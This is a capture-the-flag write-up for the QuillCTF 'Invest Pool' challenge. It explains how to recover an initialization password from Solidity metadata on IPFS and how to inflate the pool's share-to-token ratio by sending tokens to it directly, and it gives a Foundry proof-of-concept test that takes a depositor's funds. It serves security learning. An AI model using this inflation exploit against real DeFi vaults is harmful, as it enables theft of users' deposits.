---
title: QuillCTF - Invest Pool
description: 2023 | Medium | DeFi Security
tags:
    - smart contract
    - metadata
    - ipfs
---

## Objective of CTF

> Your objective is to have a greater token balance than your initial balance.

[QuillCTF Challenges - Invest Pool](https://quillctf.super.site/challenges/quillctf-challenges/invest-pool)

## Vulnerability Description

- We need to set `initialized` to true first, in order to use `deposit()` and `withdrawAll()`
    - The password can be obtained from Solidity Metadata (got hint from Discord)
    - I used [playground.sourcify.dev](https://playground.sourcify.dev/) and got the password from https://ipfs.io/ipfs/QmU3YCRfRZ1bxDNnxB4LVNCUWLs26wVaqPoQSQ6RH2u86V (The metadata hash is base58 encoded) :D
- `tokenToShares()` and `sharesToToken()` are calculated using the current token balance of the pool, and we can transfer tokens to the pool without calling `deposit()`. Therefore, we can manipulate the ratio of share to token

## Attack Steps

- `initialize()` with the password from the metadata
- The hacker deposits 1 token, then transfers 1e18 tokens to the pool directly. The current ratio of share to the token is 1: 1e18 + 1
- The user deposits 1000e18 tokens. Because of rounding down, the user can only receive 999 shares. Now the pool has 1000 shares and 1001e18 + 1 token. The current ratio of share to the token is about 1: 1001e15
- The hacker withdraws

## Proof of Concept

```js
// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

import "forge-std/Test.sol";
import "../src/poolToken.sol";
import "../src/investPool.sol";

contract Hack is Test {
    PoolToken token;
    InvestPool pool;
    address user = vm.addr(1);
    address hacker = vm.addr(2);

    function setUp() external {
        token = new PoolToken();
        pool = new InvestPool(address(token));

        token.mint(2000e18);
        token.transfer(user, 1000e18);
        token.transfer(hacker, 1000e18);

        vm.prank(user);
        token.approve(address(pool), type(uint).max);

        vm.prank(hacker);
        token.approve(address(pool), type(uint).max);
    }

    function userDeposit(uint amount) public {
        vm.prank(user);
        pool.deposit(amount);
        vm.stopPrank();
    }

    function test_hack() public {
        uint hackerBalanceBeforeHack = token.balanceOf(hacker);
        vm.startPrank(hacker);

        // solution
        pool.initialize("j5kvj49djym590dcjbm7034uv09jih094gjcmjg90cjm58bnginxxx");
        pool.deposit(1);
        token.transfer(address(pool), 1e18);

        vm.stopPrank();
        userDeposit(1000e18);

        vm.prank(hacker);
        pool.withdrawAll();

        vm.stopPrank();
        assertGt(token.balanceOf(hacker), hackerBalanceBeforeHack);
    }
}
```